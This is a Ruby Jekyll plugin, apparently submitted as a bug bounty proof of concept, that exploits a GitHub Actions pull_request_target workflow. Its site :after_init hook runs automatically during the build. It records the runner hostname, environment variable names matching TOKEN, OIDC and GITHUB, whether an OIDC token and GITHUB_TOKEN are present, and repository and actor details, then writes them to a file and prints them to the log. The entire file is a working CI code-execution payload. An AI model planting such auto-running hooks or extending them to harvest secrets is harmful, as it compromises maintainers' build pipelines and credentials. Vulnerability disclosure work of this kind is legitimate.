require 'net/http'
require 'json'

Jekyll::Hooks.register :site, :after_init do |site|
  # Bug Bounty PoC - Proof of Code Execution in privileged context
  # This demonstrates arbitrary code execution with OIDC permissions
  
  evidence = {
    timestamp: Time.now.to_s,
    runner: `hostname`.strip,
    available_env_vars: ENV.keys.grep(/ACTIONS|GITHUB|OIDC|TOKEN/).sort,
    oidc_available: !ENV['ACTIONS_ID_TOKEN_REQUEST_URL'].nil?,
    pages_permission: !ENV['GITHUB_TOKEN'].nil?,
    repo: ENV['GITHUB_REPOSITORY'],
    workflow: ENV['GITHUB_WORKFLOW'],
    actor: ENV['GITHUB_ACTOR'],
    event: ENV['GITHUB_EVENT_NAME'],
    message: 'BUG BOUNTY POC: Arbitrary code execution confirmed in pull_request_target context'
  }
  
  File.write('POC_EVIDENCE.json', JSON.pretty_generate(evidence))
  puts "[BUG BOUNTY POC] Code executed! Evidence written to POC_EVIDENCE.json"
  puts "[BUG BOUNTY POC] OIDC token available: #{evidence[:oidc_available]}"
  puts "[BUG BOUNTY POC] Available privileged env vars: #{evidence[:available_env_vars].join(', ')}"
end
